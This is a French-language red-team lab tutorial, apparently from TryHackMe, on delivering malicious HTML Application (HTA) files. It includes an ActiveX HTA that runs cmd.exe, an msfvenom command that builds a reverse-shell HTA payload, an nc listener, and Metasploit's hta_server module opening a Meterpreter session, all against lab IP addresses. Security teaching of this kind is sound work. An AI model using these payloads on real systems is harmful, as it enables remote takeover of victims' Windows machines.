Une application HTML ( HTA )
============================

HTA signifie "Application HTML". Il vous permet de créer un fichier téléchargeable contenant toutes les informations concernant son affichage et son rendu. Applications HTML, également appelées HTA, qui sont  des pages HTML dynamiques contenant JScript et VBScript. L'outil LOLBINS (Living-of-the-land Binaries)  mshta est utilisé pour exécuter des fichiers HTA . Il peut être exécuté seul ou automatiquement depuis Internet Explorer.   

Dans l'exemple suivant, nous utiliserons un  [ActiveXObject](https://en.wikipedia.org/wiki/ActiveX) dans notre charge utile comme preuve de concept pour exécuter  cmd.exe . Considérez le code HTML suivant. 

```
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>

```

Ensuite, servez le  payload.hta à partir d'un serveur Web, cela pourrait être fait à partir de la machine attaquante comme suit, 

Terminal

```
user@machine$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/)
```

Sur la machine victime, visitez le lien malveillant à l'aide de Microsoft Edge,  http://10.8.232.37:8090/payload.hta . Notez que  10.8.232.37  est l'adresse IP de l'AttackBox.

![f3a719e8137e6fdca683eefbf373ea4f](https://github.com/dsgsec/Red-Team/assets/82456829/93db68ed-e85f-48a0-9a89-3aafb3290086)

Une fois que nous appuyons sur  Run ,  le  payload.hta  est exécuté , puis il invoquera le  cmd.exe . La figure suivante montre que nous avons exécuté avec succès  cmd.exe .

![07c5180cd36650478806a1bf3d4595f2](https://github.com/dsgsec/Red-Team/assets/82456829/a6d2d736-02bc-4187-b1fa-fb7571502f68)

Connexion inversée HTA

Nous pouvons créer une charge utile de shell inversé comme suit,

Terminal

```
user@machine$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of hta-psh file: 7692 bytes
Saved as: thm.hta
```

Nous utilisons le  msfvenom du  framework Metasploit pour générer une charge utile malveillante pour se reconnecter à la machine attaquante. Nous avons utilisé la charge utile suivante pour connecter le  windows/x64/shell_reverse_tcp à notre adresse IP et à notre port d'écoute.   

Sur la machine attaquante, nous devons écouter le port  443 en utilisant  nc . Veuillez noter que ce port nécessite des privilèges root pour s'ouvrir, ou vous pouvez en utiliser différents. 

Une fois que la victime a visité l'URL malveillante et que les hits ont été exécutés, nous rétablissons la connexion.

Terminal

```
user@machine$ sudo nc -lvp 443
listening on [any] 443 ...
10.8.232.37: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.201.254] 52910
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\thm\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads>
pState\Downloads>ipconfig
ipconfig

Windows IP Configuration

Ethernet adapter Ethernet 4:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::fce4:699e:b440:7ff3%2
   IPv4 Address. . . . . . . . . . . : 10.10.201.254
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1
```

HTA malveillant via Metasploit 

Il existe un autre moyen de générer et de diffuser des fichiers HTA malveillants à l'aide du framework Metasploit. Tout d'abord, exécutez le framework Metasploit à l'aide  de la commande msfconsole -q  . Sous la section exploit, il y a  exploit/windows/misc/hta_server,  qui nécessite de sélectionner et de définir des informations telles que  LHOST ,  LPORT ,  SRVHOST ,  Payload  et enfin, d'exécuter  exploit pour exécuter le module. 

Terminal

```
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST 10.8.232.37
LHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set LPORT 443
LPORT => 443
msf6 exploit(windows/misc/hta_server) > set SRVHOST 10.8.232.37
SRVHOST => 10.8.232.37
msf6 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/misc/hta_server) >
[*] Started reverse TCP handler on 10.8.232.37:443
[*] Using URL: http://10.8.232.37:8080/TkWV9zkd.hta
[*] Server started.

```

Sur la machine victime, une fois que nous avons visité le fichier HTA malveillant fourni sous forme d'URL par Metasploit, nous devrions recevoir une connexion inversée.

Terminal

```
user@machine$ [*] 10.10.201.254    hta_server - Delivering Payload
[*] Sending stage (175174 bytes) to 10.10.201.254
[*] Meterpreter session 1 opened (10.8.232.37:443 -> 10.10.201.254:61629) at 2021-11-16 06:15:46 -0600
msf6 exploit(windows/misc/hta_server) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : DESKTOP-1AU6NT4
OS              : Windows 10 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter > shell
Process 4124 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\app>
```
